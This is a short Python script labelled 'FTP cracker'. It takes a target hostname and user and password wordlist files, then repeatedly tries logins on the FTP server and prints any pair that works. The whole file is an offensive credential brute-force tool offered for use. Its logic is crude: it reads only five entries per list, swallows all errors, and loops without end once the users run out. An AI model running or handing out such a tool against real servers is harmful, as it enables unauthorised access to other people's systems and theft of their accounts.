from ftplib import FTP
import os
print("FTP cracker")
ip = input("Hostname: ")
users = input("Userfile: ")
passwords = input("Passfile: ")
def cracked():
    print("Cracked FTP access, user: "+u[x]+" pass: "+p[y])
    print()
u = []
p = []
os.system("cls")
f = open(users, 'r')
for i in range(5):
    name = f.readline()
    name = name.rstrip("\n")
    u.append(name)
f = open(passwords, 'r')
for i in range(5):
    pas = f.readline()
    pas = pas.rstrip("\n")
    p.append(pas)
x = 0
y = 0
while True:
    ftp = FTP(ip)
    try:
        ftp.login(user=str(u[x]), passwd=str(p[y]))
        print("FTP cracked.")
        cracked()
    except:
        print("X "+str(u)+" : "+str(p))
    y += 1
    try:
        p[y]
    except:
        y = 0
        x += 1
